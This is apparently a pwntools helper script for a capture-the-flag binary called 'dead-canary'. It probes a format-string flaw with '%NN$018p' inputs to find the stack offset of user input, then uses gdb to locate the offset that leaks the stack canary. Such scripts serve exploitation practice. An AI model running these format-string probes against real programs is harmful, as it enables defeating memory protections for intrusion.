#!/usr/bin/python3

from pwn import *

def scanit(binary,t):
	context.log_level='WARN'
	p = process(binary.path)
	p.recvuntil('name: ')
	p.sendline(t)
	p.recvuntil('Hello ')
	_ = p.recvline().strip()
	p.close()
	return _

def findoffset(binary):
	for i in range(1,20):
		t = '%' + str(i).rjust(2,'0') + '$018p'
		_ = scanit(binary,t)
		print(i,_)
		if _.find(b'0x') >= 0:
			s = bytes.fromhex(_[2:].decode())[::-1]
			if s == t.encode():
				return(i)
	return None

def findcanary(binary,offset):
	for i in range(offset,50):
		t = '%' + str(i).rjust(2,'0') + '$018p'
		context.log_level='WARN'
		p = process(binary.path)
		d = process(['gdb',binary.path,'-p',str(p.pid)])
		d.sendlineafter('gdb) ','source ~/.gdbinit_gef')
		d.sendlineafter('gef➤ ','canary')
		d.recvuntil('canary of process ' + str(p.pid) + ' is ')
		canary = d.recvline().strip()
		d.sendlineafter('gef➤ ','c')
		d.close()
		p.recvuntil('name: ')
		p.sendline(t)
		p.recvuntil('Hello ')
		_ = p.recvline().strip()
		print(i,_,canary)
		if _ == canary:
			return(i)
	return None
		
binary = ELF('./dead-canary')

offset = findoffset(binary)
canaryoffset = findcanary(binary,offset)

print()
print('offset:',offset)
print('canaryoffset:',canaryoffset)

